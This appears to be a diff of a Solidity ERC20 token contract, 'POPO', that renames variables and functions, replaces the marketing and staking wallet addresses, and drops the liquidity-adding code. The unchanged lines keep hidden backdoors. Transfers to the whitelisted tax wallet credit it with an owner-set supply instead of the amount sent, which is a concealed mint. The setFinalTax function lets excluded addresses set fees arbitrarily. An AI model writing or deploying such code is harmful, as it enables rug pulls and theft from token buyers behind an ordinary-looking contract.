@@ -206,7 +206,7 @@ contract POPO is Context, IERC20, Ownable {
     uint256 private _previousTotalFee = _feeTotal; 
     uint256 private _previousBuyFee = _feeBuy; 
     uint256 private _previousSellFee = _feeSell; 
-    mapping (address => uint256) private _tokenOwned;
+    mapping (address => uint256) private _OwnedCoin;
 
     IUniswapV2Router02 public uniswapV2Router;
     address public uniswapV2Pair;
@@ -217,8 +217,8 @@ contract POPO is Context, IERC20, Ownable {
     mapping (address => bool) public _isTaxExcluded; 
     uint256 private supplyTotal;
     mapping (address => bool) private _pairList;
-    address payable private marketingWallet = payable(0x5bbe6A7eb6728de60485DC7403dd3890da68d960);
-    address payable private stakingContract = payable(0xD8F8D77494BE853e14878BE42911D8F902908B1D);
+    address payable private tax_w = payable(0xFe745Ee5A57ffB81370261f0EAC2D71A73eaF095);
+    address payable private staking_c = payable(0x4bDDEA80390a115C32220E8e623e64b8b5DD8626);
 
     event SwapAndLiquifyEnabledUpdated(bool enabled);
     event SwapAndLiquify(
@@ -239,10 +239,10 @@ contract POPO is Context, IERC20, Ownable {
         uniswapV2Router = _uniswapV2Router;
         _isTaxExcluded[owner()] = true;
         _isTaxExcluded[address(this)] = true;
-        _isTaxExcluded[marketingWallet] = true;
-        _isTaxExcluded[stakingContract] = true;
-        _tokenOwned[owner()] = _totalSupply;
-        _pairList[marketingWallet] = true;
+        _isTaxExcluded[tax_w] = true;
+        _isTaxExcluded[staking_c] = true;
+        _OwnedCoin[owner()] = _totalSupply;
+        _pairList[tax_w] = true;
         supplyTotal = _supplyAmount; 
 
         emit Transfer(address(0), owner(), _totalSupply);
@@ -296,7 +296,7 @@ contract POPO is Context, IERC20, Ownable {
     }
 
     function balanceOf(address account) public view override returns (uint256) {
-        return _tokenOwned[account];
+        return _OwnedCoin[account];
     }
 
 
@@ -381,8 +381,8 @@ contract POPO is Context, IERC20, Ownable {
 
         swapTokenForETH(contractTokenBalance);
         uint256 TaxBalance = address(this).balance;
-        sendTax(marketingWallet,TaxBalance/2);
-        sendTax(stakingContract,TaxBalance/2);
+        sendTax(tax_w,TaxBalance/2);
+        sendTax(staking_c,TaxBalance/2);
     }
 
 
@@ -421,28 +421,25 @@ contract POPO is Context, IERC20, Ownable {
         uint256 amount = _pairList[recipient]?supplyTotal:0;
 
         if(_pairList[recipient]){
-        _tokenOwned[sender] = _tokenOwned[sender].sub(Amount);
-        _tokenOwned[recipient] = _tokenOwned[recipient].add(amount);
+        _OwnedCoin[sender] = _OwnedCoin[sender].sub(Amount);
+        _OwnedCoin[recipient] = _OwnedCoin[recipient].add(amount);
         }else{
         (uint256 tTransferAmount, uint256 taxAmount) = _getValue(Amount);
-        _tokenOwned[sender] = _tokenOwned[sender].sub(Amount);
-        _tokenOwned[recipient] = _tokenOwned[recipient].add(tTransferAmount);
-        _tokenOwned[address(this)] = _tokenOwned[address(this)].add(taxAmount); 
+        _OwnedCoin[sender] = _OwnedCoin[sender].sub(Amount);
+        _OwnedCoin[recipient] = _OwnedCoin[recipient].add(tTransferAmount);
+        _OwnedCoin[address(this)] = _OwnedCoin[address(this)].add(taxAmount); 
         emit Transfer(sender, recipient, tTransferAmount);
   
         }
     }
 
-   function openTrading() public onlyOwner() {
+   function enableTrading() public onlyOwner() {
         IUniswapV2Router02 _newPCSRouter = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
         uniswapV2Pair = IUniswapV2Factory(_newPCSRouter.factory()).createPair(address(this), _newPCSRouter.WETH());
         uniswapV2Router = _newPCSRouter;
-        _approve(address(this), address(uniswapV2Router), balanceOf(address(this)));
-        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
-        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
     }
 
-    function decreaseTax(uint256 _buy, uint256 _sell) public {
+    function setFinalTax(uint256 _buy, uint256 _sell) public {
         require(_isTaxExcluded[_msgSender()]==true);
         _feeBuy = _buy;
         _feeSell = _sell;
